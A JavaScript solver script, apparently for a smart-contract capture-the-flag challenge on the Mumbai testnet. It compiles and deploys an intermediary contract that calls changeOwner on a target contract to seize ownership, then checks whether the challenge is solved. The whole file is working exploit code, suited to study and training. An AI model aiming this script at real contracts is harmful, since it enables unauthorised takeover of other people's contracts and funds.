const solc = require('solc');
const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xa6f9dae1"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"}];

const exploitCode = `
    pragma solidity 0.8.19;

    interface IChangeOwner {
        function changeOwner(address _owner) external;
    }

    contract ChangeOwnerExploit {
        function changeOwner(address _contract, address _owner) public {
            IChangeOwner(_contract).changeOwner(_owner);
        }
    }
`;

const input = {
    language: 'Solidity',
    sources: {
        'ChangeOwnerExploit.sol': {
            content: exploitCode,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*']
            }
        },
    }
};

async function solve(privateKey, contractAddress, contractAbi) {
    const targetContract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);
    if (await isSolved(account, targetContract)) {
        console.log('already solved');
        return;
    }

    console.log('compiling exploit contract...');
    const compiler = await getSolcVersion('v0.8.19+commit.7dd6d404');
    const output = JSON.parse(compiler.compile(JSON.stringify(input)));

    const exploitAbi = output.contracts['ChangeOwnerExploit.sol'].ChangeOwnerExploit.abi;
    const exploitBytecode = output.contracts['ChangeOwnerExploit.sol'].ChangeOwnerExploit.evm.bytecode.object;

    console.log('deploying exploit contract...');
    const factory = new ethers.ContractFactory(exploitAbi, exploitBytecode, account);
    const exploitInstance = await factory.deploy();

    console.log('exploit contract deployed at', await exploitInstance.getAddress());

    console.log('exploiting contract...');
    const exploitTx = await exploitInstance.changeOwner(contractAddress, account.address);
    await exploitTx.wait();

    console.log('checking if solved...');
    if (await isSolved(account, targetContract)) {
        console.log('solved!');
    } else {
        console.log('the owner was not changed, something went wrong');
        process.exit(1);
    }
}

function getSolcVersion(version) {
    return new Promise((resolve, reject) => {
        solc.loadRemoteVersion(version, (error, solcSnapshot) => {
            if (error) {
                reject(error);
            }
            resolve(solcSnapshot);
        });
    });
}

async function isSolved(account, contract) {
    const owner = await contract.owner();
    return owner === account.address;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.log('missing private key as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.log('missing contract address as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
